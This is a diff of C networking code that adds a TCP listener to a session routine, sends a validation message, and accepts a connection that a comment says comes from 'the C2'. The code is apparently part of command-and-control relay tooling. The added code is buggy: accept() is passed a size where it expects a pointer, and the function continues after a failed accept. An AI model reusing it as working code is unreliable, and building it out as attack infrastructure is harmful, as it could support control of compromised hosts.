@@ -240,7 +240,7 @@ void * transferSession(void * in){
 		pthread_mutex_unlock(&sockets_lock);
 		return NULL;
 	}
-	int tcpPort = response[1] << 8 | response[2];
+	int fssTCPPort = response[1] << 8 | response[2];
 	unsigned char * respMessage = calloc(messageLen,sizeof(unsigned char));
 	for (int i = 0;i < messageLen;i++){
 		respMessage[i] = response[i+3];
@@ -256,9 +256,31 @@ void * transferSession(void * in){
         // Craft 0x03
 	unsigned char * validation = calloc(3+messageLen,sizeof(unsigned char));
 	validation[0] = 0x03;
-	validation[1] = tcpPort >> 8;
-	validation[2] = tcpPort & 0xff;
+	int ftsTCPPort = ftsPort + 1000;
+	validation[1] = ftsTCPPort >> 8;
+	validation[2] = ftsTCPPort & 0xff;
 	memcpy(validation+3,decode(respMessage,parsed),messageLen);
+        // Start TCP Server
+	int tcpPort = ftsPort+TOTAL_SOCKETS-1; // TCP Ports begin immediately following the UDP port range, ie port 16000 UDP becomes 17000 TCP
+	int tcpSock = socket(AF_INET,SOCK_STREAM,0);
+	if (tcpSock < 0){
+		perror("Socket Error: ");
+		pthread_mutex_lock(&sockets_lock);
+		sockets[socketsIndex] = sock;
+		pthread_mutex_unlock(&sockets_lock);
+		FD_SET(sock,&fds);
+		return NULL;
+	}
+	struct sockaddr_in tcpAddr;
+	tcpAddr.sin_family = AF_INET;
+	tcpAddr.sin_port = htons(tcpPort);
+	tcpAddr.sin_addr.s_addr = INADDR_ANY;
+	if (bind(tcpSock,(struct sockaddr *) &tcpAddr,sizeof(tcpAddr)) < 0){
+		perror("Bind Error: ");
+	}
+	if (listen(tcpSock,1) < 0){
+		perror("Listen Error: ");
+	}
         // Send 0x03
 	struct sockaddr_in ctwo;
 	ctwo.sin_family = AF_INET;
@@ -272,8 +294,18 @@ void * transferSession(void * in){
 	while (sendto(sock,validation,3+messageLen,0,(struct sockaddr *) &ctwo,sizeof(ctwo)) < 3+messageLen){
 		continue;
 	}
-        // TODO start TCP handler
-	printf("%s\t%d\t%d\t%d\n",ctwoAddr,ftsPort,ctwoPort,tcpPort);
+	// Accept the connection from the C2
+	struct sockaddr_in incoming;
+	int ctwoSock = accept(tcpSock,(struct sockaddr *) &incoming,sizeof(incoming));
+	// TODO make sure its from the right IP
+	if (ctwoSock < 0){
+		perror("Handshake Error: ");
+		pthread_mutex_lock(&sockets_lock);
+		sockets[socketsIndex] = sock;
+		pthread_mutex_unlock(&sockets_lock);
+		FD_SET(sock,&fds);
+	}
+	printf("%d\n",fssTCPPort);
 	printf("done\n");
 	pthread_mutex_lock(&sockets_lock);
 	sockets[socketsIndex] = sock;
